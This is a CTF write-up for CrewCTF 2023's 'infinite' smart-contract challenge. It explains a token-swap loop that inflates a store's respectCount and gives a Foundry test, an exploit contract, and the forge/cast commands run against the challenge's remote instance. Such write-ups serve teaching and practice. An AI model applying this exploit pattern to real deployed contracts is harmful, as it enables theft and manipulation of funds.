# CrewCTF 2023 - infinite [15 solves / 930 points] [First blood 🩸]

Our goal is to set our respectCount in the fancyStore contract to >=50 

### Setup.sol :
```solidity
pragma solidity ^0.8.0;

import "./crewToken.sol";
import "./respectToken.sol";
import "./candyToken.sol";
import "./fancyStore.sol";
import "./localGang.sol";

contract Setup {

    crewToken public immutable CREW;
    respectToken public immutable RESPECT;
    candyToken public immutable CANDY;
    fancyStore public immutable STORE;
    localGang public immutable GANG;

    constructor() payable {

        CREW = new crewToken();
        RESPECT = new respectToken();
        CANDY = new candyToken();   
        STORE = new fancyStore(address(CANDY), address(RESPECT), address(CREW));
        GANG = new localGang(address(CANDY), address(RESPECT));

        RESPECT.transferOwnership(address(GANG));
        CANDY.transferOwnership(address(STORE));


    }

    function isSolved() public view returns (bool) {
        return STORE.respectCount(CREW.receiver())>=50 ;
    }
}
```

There are 3 tokens, crew, respect and candy token, at first, we have no token at all

But we can call mint() in crew token contract to claim 1 crew token for once :

```solidity
  function mint() external {
    require(!claimed , "already claimed");
    receiver = msg.sender;
    claimed = true;
    _mint(receiver, 1);
  }
```

Then, there is a `verification()` function in the fancyStore contract, which takes 1 crew token and gives us 10 candy token

```solidity
    function verification() public payable{
        require(crew.balanceOf(msg.sender)==1, "You don't have crew tokens to verify");
        require(crew.allowance(msg.sender, address(this))==1, "You need to approve the contract to transfer crew tokens");
        
        crew.transferFrom(msg.sender, address(this), 1);

        candy.mint(msg.sender, 10);
    }
```

In order to increase our respectCount, we can check what functions will increase the respectCount for msg.sender, there are 2 functions in the fancyStore contract that do that :

```solidity
    function buyCandies(uint _respectCount) public payable{
            
            require(_respectCount!=0, "You need to donate respect to buy candies");
            require(respect.balanceOf(msg.sender)>=_respectCount, "You don't have enough respect");
            require(respect.allowance(msg.sender, address(this))>=_respectCount, "You need to approve the contract to transfer respect");

            respectCount[msg.sender] += _respectCount;
            respect.transferFrom(msg.sender, address(this), _respectCount);
            timestamp[msg.sender] = block.timestamp;

            candy.mint(msg.sender, _respectCount);
    }

    function respectIncreasesWithTime() public {
        require(timestamp[msg.sender]!=0, "You need to buy candies first");
        require(block.timestamp-timestamp[msg.sender]>=1 days, "You need to wait 1 day to gain respect again");

        timestamp[msg.sender] = block.timestamp;
        uint reward = respectCount[msg.sender]/10;
        respectCount[msg.sender] += reward;
        respect.mint(msg.sender, reward);
    }
```

However, I think `respectIncreasesWithTime()` wouldn't work as it is calling `respect.mint()`, but reading `Setup.sol`, the fancyStore contract is only the owner of candy token but not respect token, so it has no access to mint respect token, so I will ignore this function

For `buyCandies()`, it will exchange respect token for candy token, also it will increase our respectCount

In order to get respect token, we can use the `gainRespect()` function in the localGang contract :

```solidity
    function gainRespect(uint _candyCount) public payable{

        require(_candyCount!=0, "You need donate candies to gain respect");
        require(candy.balanceOf(msg.sender)>=_candyCount, "You don't have enough candies");
        require(candy.allowance(msg.sender, address(this))>=_candyCount, "You need to approve the contract to transfer candies");

        candyCount[msg.sender] += _candyCount;
        candy.transferFrom(msg.sender, address(this), _candyCount);

        respect.mint(msg.sender, _candyCount);
    }
```

It will exchange candy token to respect token

We have 10 candy token, so we can call `gainRespect()` with 10 to get 10 respect token, and then call `buyCandies()` with 10 to exchange 10 respect token back to 10 candy token, also increasing our respectCount by 10

So we have 10 candy token again, and we can just repeat this until our respectCount is >= 50

### Foundry test :

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Setup.sol";

contract infiniteTest is Test {
    Setup public setupContract;
    crewToken public CREW;
    respectToken public RESPECT;
    candyToken public CANDY;
    fancyStore public STORE;
    localGang public GANG;
    address public attacker = makeAddr("attacker");
    
    function setUp() public {
        setupContract = new Setup();
        CREW = setupContract.CREW();
        RESPECT = setupContract.RESPECT();
        CANDY = setupContract.CANDY();
        STORE = setupContract.STORE();
        GANG = setupContract.GANG();
    }

    function testExploit() public {
        vm.startPrank(attacker);
        
        CREW.mint();
        CREW.approve(address(STORE), 1);
        STORE.verification();
        
        console.log("attacker candy :", CANDY.balanceOf(attacker));
        console.log("attacker respect :", RESPECT.balanceOf(attacker));
        console.log("attacker respectCount :", STORE.respectCount(attacker));
        console.log("");
        
        CANDY.approve(address(GANG), type(uint256).max);
        RESPECT.approve(address(STORE), type(uint256).max);
        
        for(uint256 i; i < 5; ++i){
            GANG.gainRespect(10);
            STORE.buyCandies(10);
        }
                
        console.log("attacker candy :", CANDY.balanceOf(attacker));
        console.log("attacker respect :", RESPECT.balanceOf(attacker));
        console.log("attacker respectCount :", STORE.respectCount(attacker));
        
        assertEq(setupContract.isSolved(), true);
    }
}
```

```
# forge test --match-path test/test.t.sol -vv
[⠘] Compiling...
No files changed, compilation skipped

Running 1 test for test/test.t.sol:infiniteTest
[PASS] testExploit() (gas: 570661)
Logs:
  attacker candy : 10
  attacker respect : 0
  attacker respectCount : 0
  
  attacker candy : 10
  attacker respect : 0
  attacker respectCount : 50

Test result: ok. 1 passed; 0 failed; finished in 4.30ms
```

It works, so I will write an exploit contract and do it on the actual remote instance

### exploit.sol :

```solidity
pragma solidity ^0.8.0;

import "./Setup.sol";

contract infiniteExploit {
    Setup public setupContract;
    crewToken public CREW;
    respectToken public RESPECT;
    candyToken public CANDY;
    fancyStore public STORE;
    localGang public GANG;
    
    function exploit(address setupAddr) public {
        setupContract = Setup(setupAddr);
        CREW = setupContract.CREW();
        RESPECT = setupContract.RESPECT();
        CANDY = setupContract.CANDY();
        STORE = setupContract.STORE();
        GANG = setupContract.GANG();
        
        CREW.mint();
        CREW.approve(address(STORE), 1);
        STORE.verification();
        CANDY.approve(address(GANG), type(uint256).max);
        RESPECT.approve(address(STORE), type(uint256).max);
        
        for(uint256 i; i < 5; ++i){
            GANG.gainRespect(10);
            STORE.buyCandies(10);
        }
    }
}
```

Then just deploy it and run it :

```
# forge create ./src/exploit.sol:infiniteExploit -r http://146.148.125.86:60081/eba8a52e-c839-4091-b2f8-4b0b0428b727 --private-key 0x7a367e755193fe4dd6dd45e54005192978d8127a04145bed6d57659be717cbbc
[⠃] Compiling...
[⠒] Compiling 1 files with 0.8.20
[⠘] Solc 0.8.20 finished in 1.70s
Compiler run successful!
Deployer: 0xd079b089e18dA8570a34C9fD34b587fa6Eb01835
Deployed to: 0xABF7d60E02BA5FC4dA72EE1c6ed323e9078f8A91
Transaction hash: 0x8f719aa97bcabf7eb0b783bd5efec377df53a02ab4e9e798bac05202a56f9ae9
```

```
# cast send 0xABF7d60E02BA5FC4dA72EE1c6ed323e9078f8A91 "exploit(address)" 0x31e026cee3c39400347d490c5C57E7666B14093c -r http://146.148.125.86:60081/eba8a52e-c839-4091-b2f8-4b0b0428b727 --private-key 0x7a367e755193fe4dd6dd45e54005192978d8127a04145bed6d57659be717cbbc
```

Finally, check if we have solved the challenge :

```
# cast call 0x31e026cee3c39400347d490c5C57E7666B14093c "isSolved()(bool)" -r http://146.148.125.86:60081/eba8a52e-c839-4091-b2f8-4b0b0428b727
true
```

### Flag :

```
# nc infinite.chal.crewc.tf 60001
1 - launch new instance
2 - kill instance
3 - get flag
action? 3
ticket please: REDACTED
This ticket is your TEAM SECRET. Do NOT SHARE IT!
crew{inf1nt3_c4n9i3s_1nfinit3_r3s9ect}
```